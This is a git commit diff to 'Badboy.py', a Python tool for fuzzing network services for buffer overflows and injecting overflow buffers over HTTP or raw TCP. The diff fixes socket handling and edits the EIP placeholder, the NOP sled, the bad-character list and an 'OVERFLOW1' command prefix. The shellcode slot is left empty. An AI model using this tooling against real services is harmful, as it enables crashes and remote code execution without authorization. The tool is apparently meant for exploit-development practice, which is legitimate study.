108d16f16867a17b83a486dadd4064e7a18863a1
Jean Jr Goulet <44183775+b4keSn4ke@users.noreply.github.com>
2022-04-12 17:18:02 -0400

    Fixed socket errors while using raw-tcp Connector

--- Badboy.py
+++ Badboy.py
@@ -11,7 +11,7 @@ def parseArgs():
   args.add_argument('--mode', help="Mode used during the execution of the script [fuzz, inject]")
   args.add_argument('-c', help="Type of connection to use during fuzzing [http, raw-tcp]")
   args.add_argument('IP', help="IP Address of the target to fuzz on")
-  args.add_argument('Port', help="Port of the target service to fuzz on")
+  args.add_argument('Port', type=int, help="Port of the target service to fuzz on")
   return args.parse_args()
 
 def checkValidOption(string, array, context):
@@ -24,33 +24,37 @@ def checkValidOption(string, array, context):
     exit()
 
 class Buffer:
-    __overflowSize = 780 # Size of the buffer in bytes
+    __overflowSize = 100 # Size of the buffer in bytes
     __overflowSizeInc = 100 # Incremental value in bytes
     __bufferOverflow = 'A' * __overflowSize
     __bufferOffset = '' # 'B' * 4
-    __eip = "\x83\x0c\x09\x10" # Replace with a 32 bits address once EIP register is controlled
-    __nopsled= "\x90" * 16 # Replace with NOP instructions for padding ( "\x90" * 16 )
+    __eip = "CCCC" # Replace with a 32 bits address once EIP register is controlled
+    __nopsled = "" * 8 # Replace with NOP instructions for padding ( "\x90" * 16 )
     __badchars = ( # All bad characters except \x00, filter them as you need
-      "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
-      "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
-      "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
-      "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
-      "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
-      "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
-      "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
-      "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
-      "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
-      "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
-      "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
-      "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
-      "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
-      "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
-      "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
-      "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+          ""
     )
 
+    #__badchars = ( # All bad characters except \x00, filter them as you need
+    #  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+    #  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+    #  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+    #  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+    #  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+    #  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+    #  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+    #  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+    #  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+    #  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+    #  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+    #  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+    #  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+    #  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+    #  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+    #  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+    #)
+
     __shellcode = ( # Put your generated shellcode here ↓
-      ""
+        ""
     )
 
     def __init__(self):
@@ -86,11 +90,12 @@ class Buffer:
     
     def getBufferString(self):
       buffer = self.__bufferOverflow + self.__bufferOffset + self.__eip + self.__nopsled + (self.__badchars if self.__shellcode == '' else self.__shellcode)
-      return bytes("username={0}&password=a".format(buffer), encoding='latin-1')
+      return bytes("OVERFLOW1 {0}".format(buffer), encoding='latin-1') # Change OVERFLOW1 with the Parameter or Argument preceding the buffer
 
 class Connector:
   __connectionType = ['http', 'raw-tcp']
   __connection = ""
+  __isConnected = False
   __sock = None
   __targetIP = ""
   __targetPort = 80
@@ -120,20 +125,24 @@ class Connector:
       if self.__connectionType[0] == self.__connection:
         requests.post(self.__targetURL,data=buffer, headers=self.__headers)
       elif self.__connectionType[1] == self.__connection:
+        
         self.__sock.send(buffer)
+        self.__sock.recv(1024)
     except:
       print ("\n[-] Cannot Connect to: {0}:{1} or service crashed".format(self.__targetIP,self.__targetPort))
       exit()
-    return
+      return
 
   def connect(self):
     try:
       print("\r[+] Connecting to {0}:{1}".format(self.__targetIP,self.__targetPort), end="")
-      if self.__connectionType[1] == self.__connection:
+      if self.__connectionType[1] == self.__connection and not self.__isConnected:
         self.__sock.connect((self.__targetIP,self.__targetPort))
+        self.__sock.recv(1024)
+        self.__isConnected = True
     except:
       print("[-] Unable to connect to {0}:{1}".format(self.__targetIP,self.__targetPort))
-    return
+      return
 
   def close(self,):
     if self.__connectionType[1] == self.__connection:
@@ -169,7 +178,6 @@ class Badboy:
     bufferSize = self.__buffer.getBufferSize() if self.__mode == self.__modeType[1] else self.__buffer.getOverflowSize()
     print ("\r[+] Sending Badboy buffer of : {0} bytes".format(str(bufferSize)), end="")
     self.__connector.send(self.__buffer.getBufferString())
-    self.__connector.close()
     return
 
   def __fuzz(self):
